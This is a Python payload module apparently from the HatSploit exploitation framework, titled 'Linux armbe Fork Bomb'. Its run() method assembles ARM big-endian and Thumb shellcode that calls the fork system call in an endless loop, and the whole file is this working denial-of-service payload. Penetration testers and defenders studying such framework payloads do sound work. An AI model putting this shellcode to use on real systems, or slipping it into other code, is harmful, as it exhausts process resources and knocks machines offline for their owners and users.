"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.core.payload.basic import *
from hatsploit.lib.core.payload.linux import Linux


class HatSploitPayload(Payload, Linux):
    def __init__(self):
        super().__init__({
            'Name': "Linux armbe Fork Bomb",
            'Payload': "linux/armbe/fork_bomb",
            'Authors': [
                "Ivan Nikolskiy (enty8080) - payload developer",
            ],
            'Description': (
                "This payload is intended to cause infinite fork() on Linux "
                "with ARM big-endian architecture."
            ),
            'Arch': ARCH_ARMBE,
            'Platform': OS_LINUX,
            'Type': ONE_SIDE,
        })

    def run(self):
        return self.__asm__(
            """
            start:
                add r1, pc, #1
                bx r1
            """
        ) + self.__asm__(
            """
            loop:
                eors r7, r7
                movs r7, #2
                svc #1
                mov r8, r8
                bl loop
            """,
            mode='thumb'
        )
